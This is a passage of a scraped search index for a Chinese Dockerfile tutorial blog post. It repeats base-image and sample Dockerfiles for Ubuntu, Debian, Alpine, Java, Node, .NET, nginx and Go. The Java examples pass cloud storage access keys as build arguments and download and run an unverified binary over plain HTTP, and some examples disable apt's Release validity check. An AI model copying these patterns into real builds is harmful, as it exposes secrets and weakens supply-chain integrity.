http://mirrors.ivolces.com/ubuntu/ jammy-backports main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-security main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls debian使用最新的 debian 版本 # bookworm 12 FROM debian:12 # apt install 的软件和 ubuntu 相同 RUN mv /etc/apt/sources.list.d/debian.sources /etc/apt/sources.list.d/debian.sources.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls ENV TZ=Asia/Shanghai alpine from alpine:latest # sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories # 设置时区和源，lrzsz因为缺少维护，所以在testing仓库中，无法直接下载 RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories \u0026\u0026 \\ apk add --no-cache --update tzdata vim chrony lftp ca-certificates tzdata less iproute2 iputils bind-tools busybox-extras htop nethogs nload tree iotop iptraf-ng zip unzip curl gnupg pcre pcre-dev openssl openssl-dev build-base rsync sshpass \u0026\u0026 \\ cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026\u0026 \\ echo \"Asia/Shanghai\" \u003e /etc/timezone ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#镜像基础环境---持续更新"},{"categories":["blog"],"content":" 镜像基础环境 - 持续更新 ubuntu采用最新的 ubuntu LTS 版本 # jammy lts FROM ubuntu:22.04 # 避免对话式弹窗 ENV DEBIAN_FRONTEND=noninteractive # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 软件源和基础配置 RUN mv /etc/apt/sources.list sources.list.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-updates main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-backports main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-security main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls debian使用最新的 debian 版本 # bookworm 12 FROM debian:12 # apt install 的软件和 ubuntu 相同 RUN mv /etc/apt/sources.list.d/debian.sources /etc/apt/sources.list.d/debian.sources.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls ENV TZ=Asia/Shanghai alpine from alpine:latest # sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories # 设置时区和源，lrzsz因为缺少维护，所以在testing仓库中，无法直接下载 RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories \u0026\u0026 \\ apk add --no-cache --update tzdata vim chrony lftp ca-certificates tzdata less iproute2 iputils bind-tools busybox-extras htop nethogs nload tree iotop iptraf-ng zip unzip curl gnupg pcre pcre-dev openssl openssl-dev build-base rsync sshpass \u0026\u0026 \\ cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026\u0026 \\ echo \"Asia/Shanghai\" \u003e /etc/timezone ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#ubuntu"},{"categories":["blog"],"content":" 镜像基础环境 - 持续更新 ubuntu采用最新的 ubuntu LTS 版本 # jammy lts FROM ubuntu:22.04 # 避免对话式弹窗 ENV DEBIAN_FRONTEND=noninteractive # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 软件源和基础配置 RUN mv /etc/apt/sources.list sources.list.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-updates main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-backports main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-security main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls debian使用最新的 debian 版本 # bookworm 12 FROM debian:12 # apt install 的软件和 ubuntu 相同 RUN mv /etc/apt/sources.list.d/debian.sources /etc/apt/sources.list.d/debian.sources.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls ENV TZ=Asia/Shanghai alpine from alpine:latest # sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories # 设置时区和源，lrzsz因为缺少维护，所以在testing仓库中，无法直接下载 RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories \u0026\u0026 \\ apk add --no-cache --update tzdata vim chrony lftp ca-certificates tzdata less iproute2 iputils bind-tools busybox-extras htop nethogs nload tree iotop iptraf-ng zip unzip curl gnupg pcre pcre-dev openssl openssl-dev build-base rsync sshpass \u0026\u0026 \\ cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026\u0026 \\ echo \"Asia/Shanghai\" \u003e /etc/timezone ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#debian"},{"categories":["blog"],"content":" 镜像基础环境 - 持续更新 ubuntu采用最新的 ubuntu LTS 版本 # jammy lts FROM ubuntu:22.04 # 避免对话式弹窗 ENV DEBIAN_FRONTEND=noninteractive # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 软件源和基础配置 RUN mv /etc/apt/sources.list sources.list.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-updates main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-backports main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/ubuntu/ jammy-security main restricted universe multiverse\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls debian使用最新的 debian 版本 # bookworm 12 FROM debian:12 # apt install 的软件和 ubuntu 相同 RUN mv /etc/apt/sources.list.d/debian.sources /etc/apt/sources.list.d/debian.sources.bak \u0026\u0026 \\ touch /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian-security/ bookworm-security main\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-updates main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"deb http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ echo \"#deb-src http://mirrors.ivolces.com/debian/ bookworm-backports main non-free non-free-firmware contrib\" \u003e\u003e /etc/apt/sources.list \u0026\u0026 \\ apt update -y \u0026\u0026 \\ apt install lftp vim ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass dnsutils -y \u0026\u0026 \\ ls ENV TZ=Asia/Shanghai alpine from alpine:latest # sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories # 设置时区和源，lrzsz因为缺少维护，所以在testing仓库中，无法直接下载 RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories \u0026\u0026 \\ apk add --no-cache --update tzdata vim chrony lftp ca-certificates tzdata less iproute2 iputils bind-tools busybox-extras htop nethogs nload tree iotop iptraf-ng zip unzip curl gnupg pcre pcre-dev openssl openssl-dev build-base rsync sshpass \u0026\u0026 \\ cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026\u0026 \\ echo \"Asia/Shanghai\" \u003e /etc/timezone ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:1","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#alpine"},{"categories":["blog"],"content":" dockerfile-dotnet 示例 FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS base # apt install 的软件和 ubuntu 相同 #RUN apt update -y \u0026\u0026 \\ # apt install lftp ca-certificates apt-transport-https tzdata telnet less iproute2 iputils-ping selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass -y \u0026\u0026 \\ # ls # ENV TZ=Asia/Shanghai WORKDIR /app # 去掉警告 ENV ASPNETCORE_HTTP_PORTS='' EXPOSE 5000 FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build WORKDIR /src COPY [\"TestServer.csproj\", \"TestServer/\"] RUN dotnet restore \"TestServer/TestServer.csproj\" COPY . TestServer/ RUN dotnet publish TestServer/TestServer.csproj -o /app/build /p:PublishProfile=Properties/PublishProfiles/linux-x64.pubxml FROM base AS publish WORKDIR /app COPY --from=build /app/build /app FROM base AS final WORKDIR /app COPY --from=publish /app /app ENTRYPOINT [\"dotnet\",\"TestServer.dll\"] ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:2","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-dotnet-示例"},{"categories":["blog"],"content":" Dockerfile-java 示例 # 基础层 FROM openjdk:8 AS base RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates \\ \u0026\u0026 apt-get update -y \\ \u0026\u0026 apt-get install vim telnet less -y # 时区 ENV TZ=Asia/Shanghai # 构建层 FROM maven:3-jdk-8 AS build WORKDIR /app/src # 外部参数 ARG oss_end_point ARG oss_ak ARG oss_sk # ossmaven RUN wget -q http://gosspublic.alicdn.com/ossutil/1.7.5/ossutil64 \\ \u0026\u0026 chmod 755 ossutil64 \\ \u0026\u0026 ./ossutil64 cp -r oss://tz-devops/cicd/ cicd/ -e $oss_end_point -i $oss_ak -k $oss_sk # 拷贝文件,帮助缓存 ADD pom.xml /app/src/pom.xml RUN mvn verify clean -q --fail-never --settings ./cicd/settings.xml # 拷贝代码 COPY . /app/src RUN mvn clean package -q -U -Dmaven.test.skip=true --settings ./cicd /settings.xml # 汇总部署层 FROM base AS publish WORKDIR /tmp/publish ARG ModuleName COPY --from=build /app/src /tmp/publish RUN mkdir -p /app/publish \\ \u0026\u0026 cp `find . -type f -regex \".*/$ModuleName[-.0-9]*[-SNAPHOTREL]*.jar\" ` /app/publish/$ModuleName.jar # 最终镜像层 FROM base AS final WORKDIR /workload ARG ModuleName ENV moduleName=$ModuleName ARG DEPLOY_PARAMS ENV deploy_params=$DEPLOY_PARAMS COPY --from=publish /app/publish/* /workload/ RUN ls \u0026\u0026 echo $deploy_params \u0026\u0026 echo $moduleName.jar CMD java $deploy_params -jar $moduleName.jar ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:3","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-java-示例"},{"categories":["blog"],"content":" Dockerfile 静态页示例 FROM nginx:1.21.1 AS base RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates \\ \u0026\u0026 apt-get update -y \\ \u0026\u0026 apt-get install vim telnet less -y ENV TZ=Asia/Shanghai FROM node:12 AS build WORKDIR /app/src RUN sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc /apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud. com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc /apt/sources.list \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates \\ \u0026\u0026 apt-get update -y \\ \u0026\u0026 apt-get install vim telnet less -y # yaml RUN npm config set registry \"镜像源\" \\ \u0026\u0026 yarn config set registry \"镜像源\" ADD package.json /app/src/package.json COPY *.lock /app/src/ COPY *.json /app/src/ ARG node_install_way RUN $node_install_way COPY . /app/src ARG DEPLOY_CMD RUN $DEPLOY_CMD FROM base AS publish WORKDIR /tmp/publish COPY --from=build /app/src/dist /tmp/publish/dist RUN mkdir -p /app/publish \\ \u0026\u0026 cp -r /tmp/publish/dist/ /app/publish FROM base AS final WORKDIR /workload ARG DEPLOY_PARAMS ENV deploy_params=$DEPLOY_PARAMS COPY --from=publish /app/publish/dist/ /usr/share/nginx/html ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:4","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-静态页示例"},{"categories":["blog"],"content":" CICD 外部构建版本/仅容器/无构建 Dockerfile-java 示例 FROM openjdk:8 AS base COPY --from=apache/skywalking-java-agent:8.9.0-alpine /skywalking/agent /agent/ COPY --from=hengyunabc/arthas:latest /opt/arthas /arthas # 参数 ARG oss_end_point ARG oss_ak ARG oss_sk # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less xfonts-utils iproute2 iputils-ping psmisc -y # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 设置宋体 RUN mkdir -p /usr/share/fonts/simsun \\ \u0026\u0026 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 \\ \u0026\u0026 chmod 755 ossutil64 \\ \u0026\u0026 ./ossutil64 cp -r oss://oss仓库/fonts/ /usr/share/fonts/simsun/ -e $oss_end_point -i $oss_ak -k $oss_sk \\ \u0026\u0026 mkfontscale \\ \u0026\u0026 mkfontdir \\ \u0026\u0026 fc-list :lang=zh FROM base AS final WORKDIR /workload ARG jar_path ENV jar_path=$jar_path ARG jar_name ENV jar_name=$jar_name # 外部设置特殊的启动参数 ARG deploy_params ENV deploy_params=$deploy_params COPY $jar_path /workload/$jar_name RUN echo $deploy_params \u0026\u0026 echo $jar_name CMD exec java $deploy_params -jar $jar_name Dockerfile-node 示例 FROM node:16 AS base WORKDIR /workload # 安装所需的程序 RUN sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less -y # 进行时区基本信息的设置 ENV TZ=\"Asia/Shanghai\" # 开始构建 COPY .nuxt /workload/.nuxt COPY static /workload/static COPY package.json /workload/package.json COPY node_modules /workload/node_modules COPY nuxt.config.js /workload/nuxt.config.js CMD npm run start Dockerfile 静态页示例配合 nginx容器配置 使用 FROM nginx:1.21.1 AS base # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less iproute2 iputils-ping -y # 进行时区等基本信息的设置 ENV TZ=Asia/Shanghai FROM base AS final WORKDIR /workload COPY nginx.conf /etc/nginx/conf.d/default.conf COPY dist /usr/share/nginx/html alpine 版本 FROM nginx:alpine # 使用alpine基础配置 COPY dist/build/h5 /usr/share/nginx/html COPY nginx.conf /etc/nginx/conf.d/default.conf Dockerfile-golang 示例 FROM golang:1.21 # 使用debian基础配置 ARG filename ENV FILENAME=$filename WORKDIR /app COPY bin/$FILENAME . CMD ./$FILENAME ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:5","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#cicd-外部构建版本仅容器无构建"},{"categories":["blog"],"content":" CICD 外部构建版本/仅容器/无构建 Dockerfile-java 示例 FROM openjdk:8 AS base COPY --from=apache/skywalking-java-agent:8.9.0-alpine /skywalking/agent /agent/ COPY --from=hengyunabc/arthas:latest /opt/arthas /arthas # 参数 ARG oss_end_point ARG oss_ak ARG oss_sk # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less xfonts-utils iproute2 iputils-ping psmisc -y # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 设置宋体 RUN mkdir -p /usr/share/fonts/simsun \\ \u0026\u0026 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 \\ \u0026\u0026 chmod 755 ossutil64 \\ \u0026\u0026 ./ossutil64 cp -r oss://oss仓库/fonts/ /usr/share/fonts/simsun/ -e $oss_end_point -i $oss_ak -k $oss_sk \\ \u0026\u0026 mkfontscale \\ \u0026\u0026 mkfontdir \\ \u0026\u0026 fc-list :lang=zh FROM base AS final WORKDIR /workload ARG jar_path ENV jar_path=$jar_path ARG jar_name ENV jar_name=$jar_name # 外部设置特殊的启动参数 ARG deploy_params ENV deploy_params=$deploy_params COPY $jar_path /workload/$jar_name RUN echo $deploy_params \u0026\u0026 echo $jar_name CMD exec java $deploy_params -jar $jar_name Dockerfile-node 示例 FROM node:16 AS base WORKDIR /workload # 安装所需的程序 RUN sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less -y # 进行时区基本信息的设置 ENV TZ=\"Asia/Shanghai\" # 开始构建 COPY .nuxt /workload/.nuxt COPY static /workload/static COPY package.json /workload/package.json COPY node_modules /workload/node_modules COPY nuxt.config.js /workload/nuxt.config.js CMD npm run start Dockerfile 静态页示例配合 nginx容器配置 使用 FROM nginx:1.21.1 AS base # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less iproute2 iputils-ping -y # 进行时区等基本信息的设置 ENV TZ=Asia/Shanghai FROM base AS final WORKDIR /workload COPY nginx.conf /etc/nginx/conf.d/default.conf COPY dist /usr/share/nginx/html alpine 版本 FROM nginx:alpine # 使用alpine基础配置 COPY dist/build/h5 /usr/share/nginx/html COPY nginx.conf /etc/nginx/conf.d/default.conf Dockerfile-golang 示例 FROM golang:1.21 # 使用debian基础配置 ARG filename ENV FILENAME=$filename WORKDIR /app COPY 